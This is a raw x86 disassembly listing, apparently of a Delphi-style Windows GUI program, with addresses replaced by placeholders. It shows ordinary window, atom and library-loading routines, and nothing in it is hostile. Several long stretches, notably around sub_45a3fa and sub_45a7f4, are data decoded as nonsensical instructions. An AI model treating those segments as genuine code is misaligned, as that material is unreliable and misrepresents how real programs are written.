mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_459a70
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_45998c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459a48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4599f0
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_459a20
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406f44
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_459a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4599bc
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_459a70
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4599d4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4599f0
pop ebx
retn
mov eax ebx
call sub_459a20
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_459ad4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459c3a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_459d58
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_459d3c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_459d3c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_459e48
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40331c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40331c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_40331c
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_40331c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404118
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404118
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_459ed0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a048
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409280
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40416c
mov eax [ rw-data ]
call sub_4045d8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40416c
mov eax [ rw-data ]
call sub_4045d8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4045d8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f64
mov [ rw-data ] eax
call sub_459ad4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4598fc
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bdb0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ce94
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46ea7c
mov ecx r-xdata
mov edx sub_44b9c4
mov eax [ r-xdata ]
call sub_4184b8
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a04f
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45a0b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a117
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a11e
retn
mov eax rw-data
call sub_40d814
call sub_459e48
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_404118
sub_45a120
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a1a6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a1ad
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_459ed0
mov eax [ r-xdata ]
call sub_41832c
mov eax [ r-xdata ]
call sub_4183cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
sub_45a3fa
fsubr [ ebx - 0x53dbffbb ]
inc ebp
add [ eax ] ch
scasb [ edi ]
inc ebp
add [ eax - 0x52 ] cl
inc ebp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb al 0xa4
inc ebp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8c40006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + ebp * 4 - 0x6c27ffbb ] cl
inc ecx
add ah dh
sbb eax 0x92f40042
pushad
xor eax 0x35540040
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x300045a6 ] bh
add [ eax ] al
add al dl
imul eax [ ecx ] sub_40354c
pop eax
xor eax 0x355c0040
inc eax
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbe52 ] ah
xchg ebx eax
inc ecx
add [ eax ] cl
mov al [ 0xffffffff9f000041 ]
inc ecx
add [ eax - 0x4f ] cl
inc ecx
add [ ecx + esi * 4 + 0x41 ] bh
add [ eax - 0x7bffbe4f ] al
mov cl 0x41
add [ ebp + 0x41 ] ah
add al bh
mov dl 0x41
add [ ebx + esi * 4 + 0x41 ] dl
add [ eax ] ch
mov ah 0x41
add [ eax + 0x640041ac ] dh
mov ah 0x41
add al bl
mov ah 0x41
add al dl
mov dh 0x45
add [ eax ] cl
scasd [ edi ]
inc ecx
add [ eax - 0x62 ] cl
inc ecx
add [ edi + ebp * 4 - 0x501bffbf ] ah
inc ecx
add [ eax - 0x50 ] dl
inc ecx
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ecx
add al ah
mov cl 0x41
add [ edi - 0x5787ffbf ] ah
inc ecx
add [ edx + esi * 4 ] bl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add ah bl
test al 0x41
add [ eax ] dh
test eax 0xa9dc0041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dh
add ah cl
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] ah
inc ecx
add [ edi + ebp * 4 + 0x41 ] ch
add [ eax - 0x7fffbe51 ] cl
mov dl 0x41
add al dl
mov al 0x41
add [ eax - 0x5fffbe4c ] dl
mov ah 0x41
add [ 0x6f685354 ] cl
jb r-xdata
arpl [ ebp + 0x74 ] si
call 0x6045e6e8
add [ eax ] al
jmp [ eax ]
inc ebx
push 0x65676e61
aam 0xa2
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
add [ 0x74617453 ] al
call 0x4045e6a1
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ edi + 0x6e ] cl
mov [ 0x580045 ] eax
add bh bh
push 0x10045ae
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffba54 ] dh
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] ah
stosd [ edi ]
inc ebp
add [ ebp * 4 - 0x538fffbb ] dh
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add ah dh
xchg edx eax
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push 0x2004174
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xa4940000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
add [ eax ] al
insb
mov [ 0x21ec0045 ] eax
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
add [ eax ] al
add [ eax ] al
add ah cl
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax ] dl
test al 0x45
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add [ eax ] al
int3
dec esp
imul esi [ ebx + 0x74 ] 0xa6ccc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
add al [ eax ]
out dx al
cmpsd [ esi ] [ edi ]
inc ebp
out dx al
inc ebx
jne r-xdata
add ah bh
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax - 0x50000000 ] ah
mov eax [ 0x21ec0045 ]
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shr [ edx + 0x41 ] 0x0
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
inc edx
in al dx
and [ edx ] eax
pop eax
xor eax 0x1b400040
dec esp
imul esi [ ebx + 0x74 ] 0xa6f40000
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
jbe r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + esi * 4 + 0x45 ] dl
add [ eax + esi * 4 + 0x1df40045 ] ah
inc edx
add ah dh
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax ] ch
and al 0x42
add [ ecx + ebp * 4 + 0x45 ] dh
add [ eax - 0x4b ] dh
inc ebp
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] al
mov al 0x45
add al ch
and al 0x42
add [ esp + 0x24200042 ] cl
inc edx
add [ eax + 0x24 ] dl
inc edx
add [ esp ] ah
inc edx
add al cl
stosb [ edi ]
inc ebp
add [ eax + 0x300045b3 ] bl
mov bl 0x45
add ah al
mov dh 0x45
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add [ eax + edx + 0x10000040 ] dl
inc eax
add [ eax - 0x59 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
sub_45a7f4
mov esp 0xe40045b5
mov ch 0x45
add [ 0x73754354 ] cl
je r-xdata
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
adc [ eax + 0xd070045 ] ch
push esp
inc ebx
jne r-xdata
scasd [ edi ]
inc ebp
add [ edi + ebp * 4 - 0x502fffbb ] bh
inc ebp
add ah dl
scasd [ edi ]
inc ebp
add al bl
scasd [ edi ]
inc ebp
add ah bl
scasd [ edi ]
inc ebp
add al ah
scasd [ edi ]
inc ebp
add ah ah
scasd [ edi ]
inc ebp
add al ch
scasd [ edi ]
inc ebp
add ah ch
scasd [ edi ]
inc ebp
add al dh
scasd [ edi ]
inc ebp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add ah bh
scasd [ edi ]
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xc5e85653
inc edx
add [ eax ] cl
scasd [ edi ]
inc ebp
add [ edi + ebp * 4 ] bl
and eax [ edx ]
inc eax
and eax [ edx ]
jo r-xdata
je r-xdata
add [ eax - 0x6bffba51 ] al
scasd [ edi ]
inc ebp
add [ eax - 0x43ffba51 ] ch
scasd [ edi ]
inc ebp
add al dl
scasd [ edi ]
scasd [ edi ]
inc ebp
inc edx
add [ eax + 0x24004222 ] dl
and eax [ edx ]
add [ ebx + 0x42 ] ch
add [ eax + 0x23 ] al
inc edx
add [ eax + 0x23 ] dh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
les esi [ esi + 0xe0045 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
add [ eax + edx + 0x780040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
inc ebp
add [ edx + 0x30045 ] al
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
add al [ eax ]
out dx al
js r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0xa8800000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
test al 0x45
add [ eax ] bl
add [ eax ] al
add ah cl
je r-xdata
inc ebp
add [ eax ] dh
scasd [ edi ]
inc ebp
add [ edi + ebp * 4 + 0x45 ] al
add [ eax - 0x51 ] bl
inc ebp
add [ edi + ebp * 4 + 0x45 ] ch
or [ edi - 0x50e3ffbb ] ch
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
and al [ edx ]
aam 0x22
inc edx
add [ ebx ] cl
inc edx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
sub_45a904
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4223c8
test bl bl
jle r-xdata
mov edx esi
call sub_45ad18
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45a974
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421edc
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_45aa1c
sub_45a9a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a938
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418be8
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_418d74
sub_45a9f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404524
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40416c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45aa1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45ad18
mov edx ebx
mov eax esi
call sub_45acf8
sub_45aa44
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45aa1c
sub_45aa70
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46f7f8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403518
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_422454
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_44b7f0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45aac8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46f820
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403518
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_422470
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_44b7f0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45ab20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421a7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45aca4
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45ab8c
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_40331c
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418de0
call sub_40331c
mov eax [ edi + 0x30 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421ac8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_45abdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_45ac24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418d54
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov edx edi
call sub_45a9a8
sub_45ac70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_45c5c0
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_421b4c
sub_45acb0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_45ad18
sub_45acf8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418b9c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_421b4c
pop esi
pop ebx
retn
sub_45ad18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418e94
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_45ad34
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45ad9c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4656d0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_45de5c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45b644
mov edx ebp
call sub_45b6fc
inc eax
je r-xdata
sub_45ae28
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_45ae48
push ebx
push ecx
